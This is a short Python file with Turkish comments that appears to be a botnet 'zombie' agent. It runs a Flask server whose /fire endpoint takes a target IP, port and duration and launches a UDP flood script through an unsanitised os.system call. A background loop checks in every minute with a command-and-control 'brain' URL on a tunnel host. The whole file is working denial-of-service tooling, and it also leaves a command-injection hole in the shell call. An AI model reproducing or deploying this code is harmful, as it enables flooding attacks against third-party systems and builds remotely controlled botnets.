import os, requests, threading, time
from flask import Flask, request

# AYARLAR - Tünel adresin
BEYIN_URL = "https://66e882b4d1e011.lhr.life"

app = Flask(__name__)

@app.route('/fire')
def fire():
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    # UDP scriptini tetikler - Gücü 3 olarak ayarladın kanka
    os.system(f"nohup python3 udp.py {target} {port} 3 {sure} > /dev/null 2>&1 &")
    return "Ateslendi", 200

def register():
    while True: # Sonsuz döngü: Zombi her zaman beyne bağlı kalır
        try:
            # Beynin /kayit rotasına port bilgisiyle selam çakar
            requests.get(f"{BEYIN_URL}/kayit?port=8080", timeout=5)
        except:
            pass
        time.sleep(60) # Dakikada bir durum bildirimi

if __name__ == '__main__':
    # Kayıt işlemini arka planda başlat
    threading.Thread(target=register, daemon=True).start()
    # Zombinin kendi kapısını aç (Emirleri buradan alacak)
    app.run(host='0.0.0.0', port=8080)
